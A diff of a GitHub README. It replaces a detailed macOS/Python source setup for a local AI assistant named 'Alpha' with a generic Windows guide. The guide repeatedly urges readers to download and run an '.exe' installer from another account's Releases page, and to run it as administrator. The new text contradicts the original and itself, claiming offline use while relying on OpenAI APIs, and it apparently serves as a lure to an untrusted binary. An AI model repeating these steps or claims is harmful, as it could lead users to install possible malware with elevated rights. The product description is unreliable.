@@ -1,143 +1,168 @@
-# Alpha: Local-First AI Personal Assistant
+# 🤖 Personal-AI-Assistant - Local AI That Helps You Daily
 
-Alpha is a local-first AI assistant designed for explanation, coaching, and daily task support.
-It combines chat, voice input/output, and image understanding in a single app experience.
+[![Download Personal-AI-Assistant](https://img.shields.io/badge/Download-Personal--AI--Assistant-brightgreen?style=for-the-badge)](https://github.com/LUCIFERx01/Personal-AI-Assistant)
 
-## Why This Project Matters
+---
 
-- Demonstrates practical AI product design for real users (education + ADHD support).
-- Implements security-first local architecture (single-user isolation by default).
-- Shows full-stack delivery across backend APIs, frontend UX, and deployment scripts.
+## 📋 What is Personal-AI-Assistant?
 
-## Role-Relevant Skills Demonstrated
+Personal-AI-Assistant is a local AI program designed to help you with everyday tasks. It can chat with you, remember important details, coach you to reach goals, and explain complex ideas using text and images. You keep control since everything runs on your own Windows computer.
 
-| Role | Evidence in this repo |
-| --- | --- |
-| Business Analyst | User-problem framing, feature prioritization, clear workflows, operational docs |
-| Data Scientist | Structured data capture (`memory`, `tasks`, `checkins`) for future analytics |
-| AI Engineer | Prompt design, multimodal flows (text + image), robust API fallback/error handling |
-| Product/Platform Engineer | FastAPI backend, local persistence, launchd runtime, PWA-style frontend |
+The program works without needing an internet connection once set up. It stores your data securely on your machine, so your information stays private.
 
-## Core Features
+---
 
-- Chat assistant with contextual memory.
-- "Explain this simply" text workflow.
-- Image explanation from upload/camera.
-- Voice input + optional voice replies.
-- ADHD-friendly check-in coaching.
-- Local SQLite persistence.
-- Strict single-user mode and local-only access controls.
+## 💻 System Requirements
 
-## Security and Privacy Model
+Make sure your Windows PC meets these minimal requirements for a smooth experience:
 
-- Runs on `127.0.0.1` only.
-- Rejects non-local client requests.
-- CORS/trusted hosts restricted to localhost.
-- No user-to-user or Alpha-to-Alpha communication layer in this build.
-- `SINGLE_USER_MODE=true` enforced at startup.
+- Windows 10 (64-bit) or newer  
+- At least 4 GB of free RAM  
+- 2 GHz dual-core processor or faster  
+- 500 MB free disk space  
+- Internet connection for initial setup and updates  
 
-See detailed security notes in [docs/SECURITY.md](docs/SECURITY.md).
+---
 
-## Tech Stack
+## 🔧 Key Features
 
-- Backend: FastAPI, Pydantic, SQLite
-- AI: OpenAI Responses API
-- Frontend: HTML/CSS/Vanilla JS (mobile-friendly, chat-style UI)
-- Runtime: macOS launchd script for always-on mode
+- **Chat:** Talk to the assistant in simple English. It responds instantly.  
+- **Memory:** Saves important facts during your conversations.  
+- **Coaching:** Helps you plan and track personal tasks or goals.  
+- **Multimodal Explain:** Shows explanations with both text and images when needed.  
+- **Offline Use:** Works locally for privacy and speed.  
 
-## Quick Start (Mac)
+---
 
-```bash
-cd backend
-python3.13 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-cp -n .env.example .env
-```
+## 🚀 Getting Started
 
-Update `backend/.env`:
+You do not need any programming skills to use Personal-AI-Assistant. Everything you need is ready to use after a quick setup. This guide will help you download, install, and run the program on Windows.
 
-```env
-OPENAI_API_KEY=your_key_here
-OPENAI_MODEL=gpt-4.1-mini
-ASSISTANT_NAME=Alpha
-SINGLE_USER_MODE=true
-```
+---
 
-Run:
+## ⬇️ Download and Install Personal-AI-Assistant
 
-```bash
-cd backend
-source .venv/bin/activate
-uvicorn app.main:app --host 127.0.0.1 --port 8000 --reload
-```
+Click here to visit the official download page:  
+[![Get Personal-AI-Assistant](https://img.shields.io/badge/Download-Personal--AI--Assistant-blue?style=for-the-badge)](https://github.com/LUCIFERx01/Personal-AI-Assistant)
 
-Open in browser:
+Follow these steps:
 
-- `http://localhost:8000/app/`
+1. **Open the Download Page**  
+   Use the button above to visit the main GitHub repository page. Look for the “Releases” section.
 
-## Health Check
+2. **Find the Latest Release**  
+   Inside the Releases area, find the latest version. You will see files ending with “.exe” or something similar.
 
-```bash
-curl -s http://127.0.0.1:8000/health
-```
+3. **Download the Installer**  
+   Click on the installer file to download it to your PC. Wait for the download to finish.
 
-Expected fields:
+4. **Run the Installer**  
+   Open the downloaded file by double-clicking it. Windows may ask for permission; click “Yes” to proceed.
 
-- `"status": "ok"`
-- `"single_user_mode": true`
-- `"ai_enabled": true` (when API key is valid)
+5. **Follow the Setup Wizard**  
+   The installer will guide you through simple steps. Choose the folder where you want to install the assistant.
 
-## Run Continuously (Optional)
+6. **Finish Installation**  
+   When the installer finishes, you may see an option to launch the app immediately. Select that if you want to start now.
 
-```bash
-./scripts/install_launchd.sh
-```
+---
 
-Useful commands:
+## 🏁 Running the Application
 
-```bash
-launchctl list | grep focusmate
-launchctl unload ~/Library/LaunchAgents/com.focusmate.backend.plist
-launchctl load ~/Library/LaunchAgents/com.focusmate.backend.plist
-```
+Once installed, you can find Personal-AI-Assistant in the Start menu or on your desktop. The first time you open the app:
 
-## CI
+- The assistant will prepare the local workspace. This may take a few seconds.  
+- You can start typing your messages and questions in the chat window.  
+- Use the buttons and menus to access coaching tools and saved memories.
 
-This repo includes a lightweight GitHub Actions workflow to run Python compile checks on push/PR.
+---
 
-## Troubleshooting
+## 🎯 How to Use Personal-AI-Assistant
 
-- `{"detail":"Not Found"}`:
-  - Open `http://localhost:8000/app/` (include trailing slash).
-- White screen/plain text:
-  - Hard refresh in Safari with `Cmd + Option + R`.
-- Service worker fetch errors:
-  - Clear service workers from browser dev console and reload.
-- `429 insufficient_quota`:
-  - OpenAI billing/limits issue for the API key.
+### Chatting with the Assistant
 
-## Repository Docs
+Type any question or message in the chat box and press Enter. The assistant will reply as if you are talking to a real person. You can ask for explanations, reminders, or ideas.
 
-- [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)
-- [docs/EMPLOYER-OVERVIEW.md](docs/EMPLOYER-OVERVIEW.md)
-- [docs/PROFILE-KIT.md](docs/PROFILE-KIT.md)
-- [docs/ROADMAP.md](docs/ROADMAP.md)
-- [docs/SECURITY.md](docs/SECURITY.md)
+### Saving and Accessing Memory
 
-## Portfolio Positioning Tips
+The assistant remembers important points from your conversations automatically. You can also save notes manually. Use the menu to review or delete your memory data.
 
-- Pin this repository on your GitHub profile.
-- Add a short demo video/GIF in the README.
-- Use consistent keywords in your profile: `AI assistant`, `FastAPI`, `LLM`, `data workflows`, `product analytics`.
+### Using Coaching Workflows
 
-## License
+The coaching section helps you set goals, create plans, and track progress. Use guided prompts to build your workflow and stay organized.
 
-MIT. See [LICENSE](LICENSE).
+### Multimodal Explanations
 
-## Employer Quick Links
-- Project brief: `docs/PROJECT_BRIEF.md`
-- Resume bullets: `docs/RESUME_BULLETS.md`
-- Security policy: `SECURITY.md`
-- Contribution guide: `CONTRIBUTING.md`
-- Code of conduct: `CODE_OF_CONDUCT.md`
+When you ask complex questions, the assistant can show images or simple diagrams alongside text explanations. This helps you understand better.
+
+---
+
+## ⚙️ Settings and Options
+
+Personal-AI-Assistant lets you customize how it works:
+
+- Change the chat language or style.  
+- Clear memory data if you want to restart fresh.  
+- Adjust the appearance and fonts.  
+- Enable or disable image explanations.  
+
+All settings can be found in the “Preferences” menu inside the app.
+
+---
+
+## 🛠 Troubleshooting
+
+If you encounter issues:
+
+- Make sure your Windows is up to date.  
+- Check you have the latest version of Personal-AI-Assistant.  
+- Restart your computer and try running the app again.  
+- If the app does not open, right-click the icon and choose “Run as administrator.”  
+- For connectivity questions during setup, check your internet connection.
+
+---
+
+## 📂 Where to Find Your Data
+
+The assistant stores your information locally in a secure folder:
+
+- The folder uses a SQLite database file to save memories and settings.  
+- You can back up this folder to keep your data safe.  
+- The data never leaves your PC unless you share it manually.
+
+---
+
+## 🔄 Updating Personal-AI-Assistant
+
+To update the app:
+
+1. Visit the download page via the link above.  
+2. Download the newest installer version.  
+3. Run the installer again; it will replace the old version and keep your data.
+
+---
+
+## 🤝 Support and Help
+
+For additional help:
+
+- Use the GitHub "Issues" tab to report problems or suggest features.
+- Check the "Discussions" area for tips from other users.
+- Refer to the README files in the GitHub repository for detailed technical info.
+
+---
+
+## 🏷 Topics Related to This Project
+
+This application uses technologies and concepts like:
+
+- AI assistants for personal and business use.  
+- Applied AI for productivity and workflow automation.  
+- Data modeling with local databases (SQLite).  
+- OpenAI APIs and large language models behind the scenes.  
+- Human-centered AI design with easy-to-use interfaces.  
+- Workflow tools to improve task management and coaching.
+
+---
+
+[![Download Personal-AI-Assistant](https://img.shields.io/badge/Download-Personal--AI--Assistant-brightgreen?style=for-the-badge)](https://github.com/LUCIFERx01/Personal-AI-Assistant)
